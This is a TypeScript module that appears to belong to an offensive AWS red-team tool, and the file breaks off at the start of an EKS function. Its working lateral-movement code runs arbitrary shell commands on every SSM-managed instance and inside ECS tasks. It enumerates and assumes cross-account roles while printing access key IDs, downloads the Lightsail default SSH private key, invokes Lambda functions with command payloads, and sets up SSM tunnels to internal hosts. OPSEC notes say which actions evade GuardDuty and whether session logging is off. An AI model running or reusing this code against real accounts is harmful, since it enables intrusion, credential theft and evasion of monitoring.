import { aws, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
  const instanceId = argVal(args, "--instance-id")
  const command = argVal(args, "--command")
  const allInstances = hasFlag(args, "--all-instances")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!allInstances && !instanceId) return { output: "ERROR: --instance-id or --all-instances required", findings: [] }
  if (!command) return { output: "ERROR: --command required", findings: [] }

  const targets = allInstances
    ? (async () => {
        const r = await aws(
          ["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"],
          profile,
          region,
          timeout,
        )
        return r.exitCode === 0 ? tryJson(r.stdout) || [] : []
      })()
    : Promise.resolve([instanceId!])

  const instances = await targets
  if (instances.length === 0) return { output: "[-] No SSM-managed instances found", findings: [] }

  const output = [`[*] SSM RunCommand — ${instances.length} target(s)\n`]

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "ssm:SendCommand", "ssm:GetCommandInvocation",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    output.push("")
  }

  for (const id of instances) {
    const r = await aws(
      [
        "ssm",
        "send-command",
        "--instance-ids",
        id,
        "--document-name",
        "AWS-RunShellScript",
        "--parameters",
        `commands=["${command}"]`,
        "--query",
        "Command.CommandId",
      ],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) {
      const cmdId = tryJson(r.stdout)
      output.push(`[+] ${id}: command sent (${cmdId})`)
      await new Promise((resolve) => setTimeout(resolve, 2000))
      const gr = await aws(
        ["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id],
        profile,
        region,
        timeout,
      )
      if (gr.exitCode === 0) {
        const inv = tryJson(gr.stdout)
        output.push(`    Status: ${inv?.Status}`)
        if (inv?.StandardOutputContent) output.push(`    Output: ${inv.StandardOutputContent.slice(0, 500)}`)
      }
    } else {
      output.push(`[-] ${id}: failed — ${r.stderr.trim().split("\n")[0]}`)
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: SendCommand, GetCommandInvocation, DescribeInstanceInformation`)
  output.push(`  GuardDuty: UnauthorizedAccess:EC2/MetadataDNSRebind (if IMDS queried)`)
  output.push(`  OPSEC: Full command + output stored in SSM Command History — visible in console`)
  return { output: output.join("\n"), findings: [] }
}

export async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
  const cluster = argVal(args, "--cluster")
  const task = argVal(args, "--task")
  const container = argVal(args, "--container")
  const command = argVal(args, "--command")
  const allTasks = hasFlag(args, "--all-tasks")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  if (!cluster) return { output: "ERROR: --cluster required", findings }

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const preflightLines: string[] = []
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "ecs:ExecuteCommand", "ecs:ListTasks", "ecs:DescribeTasks",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) preflightLines.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    preflightLines.push("")
  }

  if (!task && !allTasks) {
    const r = await aws(["ecs", "list-clusters", "--query", "clusterArns"], profile, region, timeout)
    if (r.exitCode === 0) {
      const clusters = tryJson(r.stdout) || []
      const output = [`[*] ECS Clusters: ${clusters.length}\n`, ...preflightLines]
      for (const c of clusters) output.push(`    ${c}`)

      const tasks = await aws(
        ["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"],
        profile,
        region,
        timeout,
      )
      if (tasks.exitCode === 0) {
        const taskList = tryJson(tasks.stdout) || []
        output.push(`\n[+] Tasks in ${cluster}: ${taskList.length}`)
        if (taskList.length > 0) {
          const desc = await aws(
            [
              "ecs",
              "describe-tasks",
              "--cluster",
              cluster,
              "--tasks",
              ...taskList.slice(0, 10),
              "--query",
              "tasks[].[taskArn,lastStatus,containers[].name]",
            ],
            profile,
            region,
            timeout,
          )
          if (desc.exitCode === 0) {
            const taskDetails = tryJson(desc.stdout) || []
            for (const t of taskDetails)
              output.push(`    ${t[0].split("/").pop()} (${t[1]}) — containers: ${(t[2] || []).join(",")}`)
          }
        }
      }
      output.push("\n[*] Use --task TASK --container CONTAINER --command CMD to execute")
      output.push(`\n[*] Detection:\n  CloudTrail: ListClusters, ListTasks, DescribeTasks`)
      return { output: output.join("\n"), findings }
    }
    return { output: "[-] Cannot list clusters\n\n[*] Detection:\n  CloudTrail: ListClusters", findings }
  }

  if (!command) return { output: "ERROR: --command required for execution", findings }

  const targetTasks = allTasks
    ? await (async () => {
        const r = await aws(
          ["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"],
          profile,
          region,
          timeout,
        )
        return r.exitCode === 0 ? (tryJson(r.stdout) || []).map((t: string) => t.split("/").pop()) : []
      })()
    : [task!]

  const output = [`[*] ECS Exec — cluster: ${cluster}, targets: ${targetTasks.length}\n`, ...preflightLines]

  for (const t of targetTasks) {
    const execArgs = ["ecs", "execute-command", "--cluster", cluster, "--task", t, "--command", command]
    if (container) execArgs.push("--container", container)
    execArgs.push("--interactive")

    const r = await aws(execArgs, profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`[+] Task ${t}:\n${r.stdout.trim()}`)
      findings.push({
        checkId: `AWS-ECS-${findings.length + 1}`,
        provider: "aws",
        severity: "high",
        status: "EXECUTED",
        resource: `ecs:${cluster}/${t}`,
        title: `Command executed in ECS task: ${t}`,
        details: `Command: ${command}, container: ${container || "default"}`,
        remediation: "Review ECS Exec audit logs in CloudTrail",
      })
    } else {
      output.push(`[-] Task ${t}: ${r.stderr.trim().split("\n")[0]}`)
      if (r.stderr.includes("ExecuteCommandNotEnabled")) {
        output.push(
          `    [*] ECS Exec not enabled. Enable: aws ecs update-service --cluster ${cluster} --service SVC --enable-execute-command`,
        )
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ExecuteCommand, ListTasks, DescribeTasks`)
  output.push(`  GuardDuty: N/A (ECS Exec doesn't trigger GuardDuty directly)`)
  output.push(`  OPSEC: ECS Exec sessions logged to CloudWatch Logs if task logging enabled — check task definition`)
  return { output: output.join("\n"), findings }
}

export async function crossAccountEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Cross-Account Trust Enumeration\n"]

  const callerInfo = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  let sourceArn = (tryJson(callerInfo.stdout)?.Arn || "") as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerInfo.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "iam:ListRoles", "iam:GetRole", "sts:AssumeRole",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    output.push("")
  }

  const id = await aws(["sts", "get-caller-identity", "--query", "Account"], profile, region, timeout)
  const currentAccount = tryJson(id.stdout)
  output.push(`[+] Current account: ${currentAccount}\n`)

  const roles = await aws(["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"], profile, region, timeout)
  if (roles.exitCode !== 0) return { output: `[-] Cannot list roles: ${roles.stderr.trim()}`, findings }

  const rl = tryJson(roles.stdout) || []
  const crossAccountRoles: { name: string; arn: string; trusts: string[] }[] = []

  for (const r of rl) {
    const desc = await aws(
      ["iam", "get-role", "--role-name", r[0], "--query", "Role.AssumeRolePolicyDocument"],
      profile,
      region,
      timeout,
    )
    if (desc.exitCode !== 0) continue
    const trust = tryJson(desc.stdout)
    const statements = trust?.Statement || []
    for (const st of statements) {
      if (st.Effect !== "Allow") continue
      const principals = Array.isArray(st.Principal?.AWS)
        ? st.Principal.AWS
        : st.Principal?.AWS
          ? [st.Principal.AWS]
          : []
      const external = principals.filter((p: string) => {
        const account = p.match(/::(\d+):/)?.[1] || p.replace("arn:aws:iam::", "").replace(":root", "")
        return account !== currentAccount && /^\d{12}$/.test(account)
      })
      if (external.length > 0) {
        crossAccountRoles.push({ name: r[0], arn: r[1], trusts: external })
      }
    }
  }

  output.push(`[+] Roles with cross-account trust: ${crossAccountRoles.length}\n`)
  for (const r of crossAccountRoles) {
    output.push(`    ${r.name}`)
    output.push(`      ARN: ${r.arn}`)
    output.push(`      Trusts: ${r.trusts.join(", ")}`)
    findings.push({
      checkId: "AWS-LATERAL-001",
      provider: "aws",
      severity: "high",
      status: "FOUND",
      resource: r.arn,
      title: `Cross-account trust: ${r.name}`,
      details: `Role trusts: ${r.trusts.join(", ")}`,
      remediation: "Review cross-account trust necessity and conditions",
    })
  }

  if (hasFlag(args, "--try-assume")) {
    output.push(`\n[*] Attempting to assume cross-account roles...\n`)
    for (const r of crossAccountRoles) {
      const assume = await aws(
        ["sts", "assume-role", "--role-arn", r.arn, "--role-session-name", "cyberstrike-xaccount"],
        profile,
        region,
        timeout,
      )
      if (assume.exitCode === 0) {
        const creds = tryJson(assume.stdout)?.Credentials
        output.push(`    [+] ${r.name}: ASSUMABLE — AccessKeyId: ${creds?.AccessKeyId}`)
      } else {
        output.push(`    [-] ${r.name}: not assumable from current identity`)
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListRoles, GetRole, AssumeRole`)
  output.push(`  GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (if cross-account)`)
  output.push(`  OPSEC: AssumeRole events appear in BOTH source and target account CloudTrail`)
  return { output: output.join("\n"), findings }
}

export async function vpcPeeringEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] VPC Peering Enumeration for Lateral Movement\n"]

  const peerings = await aws(["ec2", "describe-vpc-peering-connections"], profile, region, timeout)
  if (peerings.exitCode !== 0)
    return { output: `[-] Cannot describe peering connections: ${peerings.stderr.trim()}`, findings }

  const pl = tryJson(peerings.stdout)?.VpcPeeringConnections || []
  output.push(`[+] VPC Peering Connections: ${pl.length}\n`)

  for (const p of pl) {
    const reqVpc = p.RequesterVpcInfo || {}
    const accVpc = p.AccepterVpcInfo || {}
    output.push(`    ${p.VpcPeeringConnectionId} (${p.Status?.Code})`)
    output.push(
      `      Requester: ${reqVpc.VpcId} (${reqVpc.CidrBlock}) — account: ${reqVpc.OwnerId} — region: ${reqVpc.Region}`,
    )
    output.push(
      `      Accepter:  ${accVpc.VpcId} (${accVpc.CidrBlock}) — account: ${accVpc.OwnerId} — region: ${accVpc.Region}`,
    )

    if (reqVpc.OwnerId !== accVpc.OwnerId) {
      findings.push({
        checkId: "AWS-LATERAL-002",
        provider: "aws",
        severity: "high",
        status: "FOUND",
        resource: `vpc:peering:${p.VpcPeeringConnectionId}`,
        title: `Cross-account VPC peering: ${p.VpcPeeringConnectionId}`,
        details: `Peering between accounts ${reqVpc.OwnerId} and ${accVpc.OwnerId}`,
        remediation: "Review peering route tables and security groups for least-privilege",
      })
    }

    const dnsRes = p.RequesterVpcInfo?.PeeringOptions?.AllowDnsResolutionFromRemoteVpc
    if (dnsRes) output.push(`      [!] DNS resolution from remote VPC enabled`)
  }

  const rtbs = await aws(
    ["ec2", "describe-route-tables", "--query", "RouteTables[].[RouteTableId,VpcId,Routes[?VpcPeeringConnectionId]]"],
    profile,
    region,
    timeout,
  )
  if (rtbs.exitCode === 0) {
    const rl = tryJson(rtbs.stdout) || []
    const withPeering = rl.filter((r: (string | null[])[]) => (r[2] || []).length > 0)
    if (withPeering.length > 0) {
      output.push(`\n[+] Route tables with peering routes: ${withPeering.length}`)
      for (const r of withPeering) {
        const peeringRoutes = (r[2] || []).filter(Boolean)
        for (const route of peeringRoutes) {
          output.push(`    ${r[0]} (${r[1]}): ${route.DestinationCidrBlock} → ${route.VpcPeeringConnectionId}`)
        }
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: DescribeVpcPeeringConnections, DescribeRouteTables`)
  output.push(`  OPSEC: Read-only enumeration — low alert signal but high volume may trigger anomaly rules`)
  return { output: output.join("\n"), findings }
}

export async function transitGatewayEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Transit Gateway Enumeration\n"]

  const tgws = await aws(
    ["ec2", "describe-transit-gateways", "--query", "TransitGateways[].[TransitGatewayId,State,OwnerId,Description]"],
    profile,
    region,
    timeout,
  )
  if (tgws.exitCode !== 0) return { output: `[-] Cannot describe transit gateways: ${tgws.stderr.trim()}`, findings }

  const tl = tryJson(tgws.stdout) || []
  output.push(`[+] Transit Gateways: ${tl.length}`)

  for (const tgw of tl) {
    output.push(`\n    ${tgw[0]} — ${tgw[1]} — owner: ${tgw[2]} — ${tgw[3] || ""}`)

    const attachments = await aws(
      [
        "ec2",
        "describe-transit-gateway-attachments",
        "--filters",
        `Name=transit-gateway-id,Values=${tgw[0]}`,
        "--query",
        "TransitGatewayAttachments[].[TransitGatewayAttachmentId,ResourceType,ResourceId,ResourceOwnerId,State]",
      ],
      profile,
      region,
      timeout,
    )
    if (attachments.exitCode === 0) {
      const al = tryJson(attachments.stdout) || []
      output.push(`      Attachments: ${al.length}`)
      for (const a of al) {
        output.push(`        ${a[0]} — ${a[1]}:${a[2]} — owner: ${a[3]} — ${a[4]}`)
      }

      const uniqueOwners = [...new Set(al.map((a: string[]) => a[3]).filter(Boolean))]
      if (uniqueOwners.length > 1) {
        findings.push({
          checkId: "AWS-LATERAL-003",
          provider: "aws",
          severity: "high",
          status: "FOUND",
          resource: `tgw:${tgw[0]}`,
          title: `Multi-account transit gateway: ${tgw[0]}`,
          details: `TGW connects ${uniqueOwners.length} accounts: ${uniqueOwners.join(", ")}`,
          remediation: "Review TGW route tables for network segmentation",
        })
      }
    }

    const rtbs = await aws(
      [
        "ec2",
        "describe-transit-gateway-route-tables",
        "--filters",
        `Name=transit-gateway-id,Values=${tgw[0]}`,
        "--query",
        "TransitGatewayRouteTables[].[TransitGatewayRouteTableId,State,DefaultAssociationRouteTable]",
      ],
      profile,
      region,
      timeout,
    )
    if (rtbs.exitCode === 0) {
      const rtl = tryJson(rtbs.stdout) || []
      output.push(`      Route Tables: ${rtl.length}`)
      for (const rt of rtl) {
        output.push(`        ${rt[0]} — ${rt[1]}${rt[2] ? " (default)" : ""}`)
        const routes = await aws(
          [
            "ec2",
            "search-transit-gateway-routes",
            "--transit-gateway-route-table-id",
            rt[0],
            "--filters",
            "Name=state,Values=active",
          ],
          profile,
          region,
          timeout,
        )
        if (routes.exitCode === 0) {
          const routeList = tryJson(routes.stdout)?.Routes || []
          for (const route of routeList.slice(0, 10)) {
            output.push(
              `          ${route.DestinationCidrBlock} → ${route.Type} (${(route.TransitGatewayAttachments || []).map((a: Record<string, string>) => a.ResourceId).join(",")})`,
            )
          }
        }
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: DescribeTransitGateways, DescribeTransitGatewayAttachments, DescribeTransitGatewayRouteTables, SearchTransitGatewayRoutes`)
  output.push(`  OPSEC: Read-only network topology enum — defenders rarely alert on TGW describe calls`)
  return { output: output.join("\n"), findings }
}

export async function lightsailExec(args: string[], timeout: number): Promise<HookResult> {
  const instanceName = argVal(args, "--instance-name")
  const command = argVal(args, "--command")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Lightsail Instance Enumeration\n"]
  const findings: Finding[] = []

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "lightsail:GetInstances", "lightsail:DownloadDefaultKeyPair",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    output.push("")
  }

  const instances = await aws(
    [
      "lightsail",
      "get-instances",
      "--query",
      "instances[].[name,state.name,publicIpAddress,privateIpAddress,blueprintId,bundleId]",
    ],
    profile,
    region,
    timeout,
  )
  if (instances.exitCode !== 0)
    return { output: `[-] Cannot list Lightsail instances: ${instances.stderr.trim()}`, findings }

  const il = tryJson(instances.stdout) || []
  output.push(`[+] Lightsail Instances: ${il.length}`)
  for (const i of il) {
    output.push(`    ${i[0]} — ${i[1]} — public: ${i[2] || "none"} — private: ${i[3]} — ${i[4]} (${i[5]})`)
  }

  if (!instanceName) {
    const keys = await aws(
      ["lightsail", "get-key-pairs", "--query", "keyPairs[].[name,fingerprint]"],
      profile,
      region,
      timeout,
    )
    if (keys.exitCode === 0) {
      const kl = tryJson(keys.stdout) || []
      output.push(`\n[+] Key Pairs: ${kl.length}`)
      for (const k of kl) output.push(`    ${k[0]} — ${k[1]}`)
    }
    output.push("\n[*] Use --instance-name NAME --command CMD to execute")
    return { output: output.join("\n"), findings }
  }

  if (!command) return { output: output.join("\n") + "\n\nERROR: --command required for execution", findings }

  const keyPair = await aws(["lightsail", "download-default-key-pair"], profile, region, timeout)
  if (keyPair.exitCode === 0) {
    const kp = tryJson(keyPair.stdout)
    if (kp?.privateKeyBase64 || kp?.publicKeyBase64) {
      output.push(`\n[+] Default key pair downloaded`)
      findings.push({
        checkId: "AWS-LATERAL-004",
        provider: "aws",
        severity: "high",
        status: "OBTAINED",
        resource: `lightsail:keypair`,
        title: "Lightsail default key pair extracted",
        details: "Default SSH key pair gives access to all Lightsail instances using it",
        remediation: "Rotate key pairs and restrict DownloadDefaultKeyPair",
      })
    }
  }

  output.push(`\n[*] To execute on ${instanceName}:`)
  output.push(`    1. Save downloaded private key to file`)
  output.push(`    2. ssh -i key.pem <user>@<public_ip> '${command}'`)
  output.push(`    3. Or use SSM if agent is installed`)

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: GetInstances, GetKeyPairs, DownloadDefaultKeyPair`)
  output.push(`  OPSEC: DownloadDefaultKeyPair is a high-signal event — grants SSH to all instances using default key`)
  return { output: output.join("\n"), findings }
}

export async function codeExecLambda(args: string[], timeout: number): Promise<HookResult> {
  const funcName = argVal(args, "--function-name")
  const command = argVal(args, "--command") || "aws sts get-caller-identity"
  const payload = argVal(args, "--payload")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Lambda Code Execution\n"]
  const findings: Finding[] = []

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  if (funcName) {
    const sim = await aws(
      [
        "iam", "simulate-principal-policy",
        "--policy-source-arn", sourceArn,
        "--action-names", "lambda:InvokeFunction",
        "--query", "EvaluationResults[0].EvalDecision",
      ],
      profile, region, timeout,
    )
    if (sim.exitCode === 0) {
      const decision = tryJson(sim.stdout)
      output.push(`[${decision === "allowed" ? "+" : "-"}] Pre-flight: lambda:InvokeFunction — ${decision}\n`)
    }
  }

  if (!funcName) {
    const funcs = await aws(
      ["lambda", "list-functions", "--query", "Functions[].[FunctionName,Runtime,Role,VpcConfig.VpcId]"],
      profile,
      region,
      timeout,
    )
    if (funcs.exitCode === 0) {
      const fl = tryJson(funcs.stdout) || []
      output.push(`[+] Lambda Functions: ${fl.length}`)
      const vpcFuncs = fl.filter((f: (string | null)[]) => f[3])
      if (vpcFuncs.length > 0) {
        output.push(`\n[+] VPC-attached functions (network pivot targets):`)
        for (const f of vpcFuncs)
          output.push(`    ${f[0]} (${f[1]}) — VPC: ${f[3]} — role: ${(f[2] || "").split("/").pop()}`)
      }
    }
    output.push("\n[*] Use --function-name NAME to invoke directly")
    return { output: output.join("\n"), findings }
  }

  const invokePayload = payload || JSON.stringify({ cmd: command })

  const r = await aws(
    [
      "lambda",
      "invoke",
      "--function-name",
      funcName,
      "--payload",
      invokePayload,
      "--cli-binary-format",
      "raw-in-base64-out",
      "/dev/stdout",
    ],
    profile,
    region,
    timeout,
  )

  if (r.exitCode === 0) {
    output.push(`[+] Invocation successful:`)
    output.push(r.stdout.trim())
    findings.push({
      checkId: "AWS-LATERAL-005",
      provider: "aws",
      severity: "high",
      status: "EXECUTED",
      resource: `lambda:${funcName}`,
      title: `Code executed via Lambda: ${funcName}`,
      details: `Direct invocation with payload: ${invokePayload.slice(0, 80)}`,
      remediation: "Restrict lambda:InvokeFunction permissions",
    })
  } else {
    output.push(`[-] Invocation failed: ${r.stderr.trim()}`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: Invoke20150331, ListFunctions20150331`)
  output.push(`  GuardDuty: N/A (Lambda invocation doesn't trigger GuardDuty directly)`)
  output.push(`  OPSEC: Lambda CloudWatch Logs contain function output — check log group /aws/lambda/${funcName || "<name>"}`)
  return { output: output.join("\n"), findings }
}

export async function ssmSession(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const instanceId = argVal(args, "--instance-id")
  const portForward = argVal(args, "--port-forward")
  const remoteHost = argVal(args, "--remote-host")
  const findings: Finding[] = []
  const output: string[] = ["[*] SSM Session Manager — Interactive Shell & Port Forwarding\n"]

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "ssm:StartSession", "ssm:DescribeInstanceInformation",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    output.push("")
  }

  const instances = await aws(
    [
      "ssm",
      "describe-instance-information",
      "--query",
      "InstanceInformationList[].[InstanceId,PingStatus,PlatformType,PlatformName,AgentVersion,ComputerName,IPAddress]",
    ],
    profile,
    region,
    timeout,
  )
  if (instances.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: ssm:DescribeInstanceInformation", findings }

  const il = tryJson(instances.stdout) || []
  output.push(`[+] SSM-managed instances: ${il.length}\n`)

  const onlineInstances: string[] = []
  for (const i of il) {
    const status = i[1] === "Online" ? "[ONLINE]" : "[OFFLINE]"
    output.push(
      `  ${status} ${i[0]}  Platform: ${i[3] || i[2]}  Agent: ${i[4]}  Name: ${i[5] || "N/A"}  IP: ${i[6] || "N/A"}`,
    )
    if (i[1] === "Online") onlineInstances.push(i[0])
  }

  if (!onlineInstances.length) {
    output.push("\n[-] No online instances found")
    return { output: output.join("\n"), findings }
  }

  for (const id of onlineInstances) {
    findings.push({
      checkId: "AWS-LATERAL-006",
      provider: "aws",
      severity: "high",
      status: "AVAILABLE",
      resource: `ssm:session:${id}`,
      title: `SSM Session Manager available: ${id}`,
      details: "Interactive shell access without SSH keys, security groups, or direct network — tunnels through HTTPS",
      remediation: "Restrict ssm:StartSession via IAM policy with condition keys",
    })
  }

  if (!instanceId) {
    output.push(`\n[*] Usage:`)
    output.push(`  Interactive shell: awshook ssm_session --instance-id ID`)
    output.push(`  Port forward:      awshook ssm_session --instance-id ID --port-forward 8080:80`)
    output.push(
      `  Remote host:       awshook ssm_session --instance-id ID --port-forward 3306 --remote-host rds.endpoint.com`,
    )
    output.push(`\n[*] SSM Session advantages over RunCommand:`)
    output.push(`  - Interactive shell (not one-shot)`)
    output.push(`  - Port forwarding through HTTPS tunnel`)
    output.push(`  - No inbound security group rules needed`)
    output.push(`  - Session logging may be disabled (check preferences)`)
    return { output: output.join("\n"), findings }
  }

  if (!onlineInstances.includes(instanceId)) {
    output.push(`\n[-] Instance ${instanceId} is not online or not SSM-managed`)
    return { output: output.join("\n"), findings }
  }

  const prefs = await aws(
    ["ssm", "get-document", "--name", "SSM-SessionManagerRunShell", "--query", "Content"],
    profile,
    region,
    timeout,
  )
  if (prefs.exitCode === 0) {
    const content = tryJson(prefs.stdout) || prefs.stdout
    const prefStr = typeof content === "string" ? content : JSON.stringify(content)
    const logging = prefStr.includes('"cloudWatchLogGroupName"') || prefStr.includes('"s3BucketName"')
    output.push(
      `\n[*] Session logging: ${logging ? "ENABLED — sessions may be recorded" : "DISABLED — sessions are not logged"}`,
    )
    if (!logging) {
      findings.push({
        checkId: "AWS-LATERAL-007",
        provider: "aws",
        severity: "medium",
        status: "DISABLED",
        resource: "ssm:session:logging",
        title: "SSM Session Manager logging is disabled",
        details: "Interactive sessions are not logged to CloudWatch or S3 — activity is invisible",
        remediation: "Enable SSM Session Manager logging in preferences",
      })
    }
  }

  if (portForward) {
    const parts = portForward.split(":")
    const localPort = parts[0]
    const remotePort = parts[1] || parts[0]

    if (remoteHost) {
      output.push(
        `\n[+] Starting remote host port forward: localhost:${localPort} → ${remoteHost}:${remotePort} via ${instanceId}`,
      )
      output.push(
        `    Command: aws ssm start-session --target ${instanceId} --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["${remoteHost}"],"portNumber":["${remotePort}"],"localPortNumber":["${localPort}"]}'`,
      )
      findings.push({
        checkId: "AWS-LATERAL-008",
        provider: "aws",
        severity: "critical",
        status: "READY",
        resource: `ssm:portforward:${instanceId}:${remoteHost}:${remotePort}`,
        title: `SSM port forward to ${remoteHost}:${remotePort} via ${instanceId}`,
        details: `Tunnel: localhost:${localPort} → ${remoteHost}:${remotePort} through ${instanceId} — access internal services (RDS, ElastiCache, etc.)`,
        remediation: "Restrict ssm:StartSession with document name condition",
      })
    } else {
      output.push(`\n[+] Starting port forward: localhost:${localPort} → ${instanceId}:${remotePort}`)
      output.push(
        `    Command: aws ssm start-session --target ${instanceId} --document-name AWS-StartPortForwardingSession --parameters '{"portNumber":["${remotePort}"],"localPortNumber":["${localPort}"]}'`,
      )
      findings.push({
        checkId: "AWS-LATERAL-010",
        provider: "aws",
        severity: "high",
        status: "READY",
        resource: `ssm:portforward:${instanceId}:${remotePort}`,
        title: `SSM port forward to ${instanceId}:${remotePort}`,
        details: `Tunnel: localhost:${localPort} → ${instanceId}:${remotePort}`,
        remediation: "Restrict ssm:StartSession with document name condition",
      })
    }
  } else {
    output.push(`\n[+] Starting interactive session with ${instanceId}`)
    output.push(
      `    Command: aws ssm start-session --target ${instanceId}${profile ? ` --profile ${profile}` : ""}${region ? ` --region ${region}` : ""}`,
    )
    output.push(`\n[*] Run the above command in your terminal for interactive shell`)
    output.push(`[*] For automated commands, use ssm_exec instead`)
    findings.push({
      checkId: "AWS-LATERAL-009",
      provider: "aws",
      severity: "high",
      status: "READY",
      resource: `ssm:session:${instanceId}`,
      title: `SSM interactive session ready: ${instanceId}`,
      details: "Interactive shell via HTTPS tunnel — no SSH, no security group, no key pair needed",
      remediation: "Restrict ssm:StartSession via IAM policy",
    })
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: StartSession, DescribeInstanceInformation, GetDocument`)
  output.push(`  GuardDuty: N/A (SSM sessions don't trigger GuardDuty directly)`)
  output.push(`  OPSEC: Session activity optionally logged to CloudWatch/S3 — check SSM-SessionManagerRunShell preferences`)
  return { output: output.join("\n"), findings }
}

export async function eksLateral(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
